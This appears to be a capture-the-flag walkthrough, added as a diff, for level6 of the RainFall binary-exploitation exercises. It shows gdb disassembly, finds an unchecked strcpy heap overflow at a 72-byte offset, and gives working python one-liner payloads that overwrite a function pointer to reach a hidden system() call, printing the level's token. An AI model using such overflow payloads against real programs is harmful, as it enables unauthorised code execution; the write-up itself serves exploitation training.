@@ -1,0 +1,103 @@
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804847c <+0>:	push   %ebp
+   0x0804847d <+1>:	mov    %esp,%ebp
+   0x0804847f <+3>:	and    $0xfffffff0,%esp
+   0x08048482 <+6>:	sub    $0x20,%esp
+   0x08048485 <+9>:	movl   $0x40,(%esp)
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+   0x08048495 <+25>:	movl   $0x4,(%esp)
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+   0x080484a5 <+41>:	mov    $0x8048468,%edx
+   0x080484aa <+46>:	mov    0x18(%esp),%eax
+   0x080484ae <+50>:	mov    %edx,(%eax)
+   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
+   0x080484b3 <+55>:	add    $0x4,%eax
+   0x080484b6 <+58>:	mov    (%eax),%eax
+   0x080484b8 <+60>:	mov    %eax,%edx
+   0x080484ba <+62>:	mov    0x1c(%esp),%eax
+   0x080484be <+66>:	mov    %edx,0x4(%esp)
+   0x080484c2 <+70>:	mov    %eax,(%esp)
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    0x18(%esp),%eax
+   0x080484ce <+82>:	mov    (%eax),%eax
+   0x080484d0 <+84>:	call   *%eax
+   0x080484d2 <+86>:	leave  
+   0x080484d3 <+87>:	ret    
+End of assembler dump.
+(gdb) disas m
+Dump of assembler code for function m:
+   0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	sub    $0x18,%esp
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+   0x0804847a <+18>:	leave  
+   0x0804847b <+19>:	ret    
+End of assembler dump.
+
+Inspecting the executable with objdump we can see there is a 3rd function n :
+
+level6@RainFall:~$ objdump -t ./level6 | grep "text"
+080483a0 l    d  .text	00000000              .text
+080483d0 l     F .text	00000000              __do_globaledtors_aux
+08048430 l     F .text	00000000              frame_dummy
+08048560 l     F .text	00000000              __do_global_ctors_aux
+08048550 g     F .text	00000002              __libc_csu_fini
+08048552 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
+08048454 g     F .text	00000014              n
+080484e0 g     F .text	00000061              __libc_csu_init
+080483a0 g     F .text	00000000              _start
+08048468 g     F .text	00000014              m
+0804847c g     F .text	00000058              main
+
+So we can disas it with gdb
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048454 <+0>:	push   %ebp
+   0x08048455 <+1>:	mov    %esp,%ebp
+   0x08048457 <+3>:	sub    $0x18,%esp
+   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
+   0x08048461 <+13>:	call   0x8048370 <system@plt>
+   0x08048466 <+18>:	leave  
+   0x08048467 <+19>:	ret    
+End of assembler dump.
+
+In the main function there are 2 calls to malloc and 1 to strcpy
+We know that strcpy is vulnerable to overflows so we can start there.
+First we need to find the offset to make strcpy overflowed.
+
+/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+Segmentation fault (core dumped)
+
+We segfault of course, but we need to know where :
+
+level6@RainFall:~$ dmesg
+...
+[ 5062.423491] level6[3006]: segfault at 41346341 ip 41346341 sp bffff56c error 14
+
+With the help of a pattern generator online we do know that the overflow 
+happenes at 72, let's confirm that :
+
+level6@RainFall:~$ ./level6 $(python -c 'print "X" * 71')
+Nope
+level6@RainFall:~$ ./level6 $(python -c 'print "X" * 72')
+Segmentation fault (core dumped)
+
+Indeed it's the case.
+Let's take a look again at the main function, after the call to strcpy
+there is a pointer to function call to m
+Thanks to the overflow we can overwrite that call, and change it to the address of n
+We can test this by calling first m like the program does originally:
+
+level6@RainFall:~$ ./level6 $(python -c 'print "X" * 72 + "\x68\x84\x04\x08"')
+Nope
+
+It works ! Now we just nee to change the address to n :
+
+level6@RainFall:~$ ./level6 $(python -c 'print "X" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
